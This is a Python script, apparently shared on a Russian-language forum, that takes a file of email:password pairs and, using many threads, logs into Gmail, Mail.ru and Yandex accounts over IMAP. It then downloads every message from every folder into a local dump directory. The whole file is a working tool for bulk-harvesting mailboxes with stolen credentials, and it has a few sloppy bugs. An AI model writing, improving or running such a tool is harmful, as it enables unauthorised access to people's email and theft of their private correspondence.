import imaplib
from colorama import Fore as C
from colorama import init
from threading import Thread
from queue import Queue
import os,sys
from datetime import datetime
import shutil
q = Queue()
emails = []
os.system('cls')
init()

 #не удаляй
banner = f'''{C.YELLOW}
·▄▄▄▄  ▄• ▄▌• ▌ ▄ ·.  ▄▄▄· ▪  ▄▄▌  
██▪ ██ █▪██▌·██ ▐███▪▐█ ▀█ ██ ██•  
▐█· ▐█▌█▌▐█▌▐█ ▌▐▌▐█·▄█▀▀█ ▐█·██▪  
██. ██ ▐█▄█▌██ ██▌▐█▌▐█ ▪▐▌▐█▌▐█▌▐▌
▀▀▀▀▀•  ▀▀▀ ▀▀  █▪▀▀▀ ▀  ▀ ▀▀▀.▀▀▀ 
{C.LIGHTYELLOW_EX} by https://lolz.guru/members/2977610/
'''
print(banner)
    #не удаляй
 #не удаляй
while True:
    try:
        with open(input(f'{C.GREEN}file to mails (in file: {C.RED}mail@mail.ru:password{C.GREEN}): '),'r') as file:[emails.append(e.replace('\n',''))for e in file.readlines()];break
    except KeyboardInterrupt:sys.exit(0)
    except:print(f'{C.RED}Файл не существует.')

        


imap = {
    'gmail.com': 'imap.gmail.com',
    'mail.ru': 'imap.mail.ru',
    'yandex.ru': 'imap.yandex.ru',
    'ya.ru': 'imap.yandex.ru'
}



date = datetime.strftime(datetime.now(),'%d-%m-%m %H-%M')
floder = f'dump({date})'
try:os.mkdir(floder)
except Exception as e:print(e)

def conn():
    email = q.get()
    try:
        mail,passwd = email.split(':')
        M = imaplib.IMAP4_SSL(imap[mail.split('@')[1]])
        M.login(mail,passwd)
        for i in M.list()[1]:
            if '@mail.ru'in mail or '@gmail.com' in mail:u = '"/"'
            elif '@yandex.ru' in mail or "@ya.ru" in mail:u = '"|"'
            tg = i.decode().split(u)[1].replace(' ','')
            rv, data = M.select(tg)
            mmail = mail
            if rv == 'OK':
                rv, data  = M.search(None,'ALL')
                if rv != 'OK':print(f'{C.RED}Error in {email}: No messages found!"');M.close();M.logout();q.task_done();q.task_done();return
                try:os.mkdir(f'{floder}/{mmail}')
                except Exception as e:print(e)
                for num in data[0].split():
                    rv, data = M.fetch(num, '(RFC822)')
                    if rv != 'OK':print(f'{C.RED}Error in {email}: ERROR getting message"');shutil.rmtree(f'{floder}/{mmail}').d;M.close();M.logout();q.task_done();return
                    num  = str(num).replace("b'",'').replace("'",'')
                    f = open(f'{floder}/{mmail}/{num}.eml', 'wb')
                    f.write(data[0][1])
                    f.close()
        M.close();M.logout();q.task_done()
    except:
        print(f'{C.RED}Error in {email}')
        print(email,file=open(f'{floder}/errors.txt','a+'))
    q.task_done()


def main():
    for i in emails:q.put(i)
    for i in emails:th = Thread(target=conn,daemon=True);th.start()
    print(f'{C.GREEN}Launch {C.RED}{str(len(emails))}{C.GREEN} threads.')
    q.join()
    


if __name__ == "__main__":
    main()
    print(f'{C.CYAN}Result in {floder}')
    os.system(f'explorer {floder}')
    input('Нажми ЭнТеР...')